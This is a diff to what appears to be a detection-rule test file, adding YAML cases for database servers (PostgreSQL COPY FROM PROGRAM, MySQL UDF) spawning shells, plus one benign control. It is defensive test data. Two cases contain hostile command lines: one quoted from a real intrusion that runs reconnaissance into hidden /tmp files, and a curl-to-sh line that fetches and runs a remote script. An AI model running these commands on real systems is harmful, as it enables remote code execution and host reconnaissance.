@@ -153,3 +153,51 @@ cases:
         file:
           path: /usr/bin/bash
         cmd_line: "bash"
+
+  - name: PostgreSQL COPY FROM PROGRAM 拉起 sh（2026-11-03 生产库入侵原文）
+    source: 生产事件 openxdr-node1 2026-11-03 00:09:53 UTC
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: sh
+        file:
+          path: /bin/sh
+        cmd_line: "sh -c cat > /tmp/.pg_to_test; id > /tmp/.pg_to_out 2>&1; uname -a >> /tmp/.pg_to_out 2>&1"
+        parent_process:
+          name: postgres
+          file:
+            path: /usr/lib/postgresql/16/bin/postgres
+          cmd_line: "postgres: postgres openxdr 10.1.1.170(41866) COPY"
+
+  - name: MySQL UDF 拉起 bash
+    source: 常见手法（lib_mysqludf_sys sys_exec）
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        file:
+          path: /usr/bin/bash
+        cmd_line: "bash -c curl http://10.0.0.1/x.sh | sh"
+        parent_process:
+          name: mysqld
+          file:
+            path: /usr/sbin/mysqld
+
+  - name: PostgreSQL 启动时 locale -a 不是命令执行（良性对照）
+    source: 生产事件 raid-server-test 2026-11-03
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: sh
+        file:
+          path: /bin/sh
+        cmd_line: "sh -c -- locale -a"
+        parent_process:
+          name: postgres
+          file:
+            path: /usr/lib/postgresql/16/bin/postgres
+
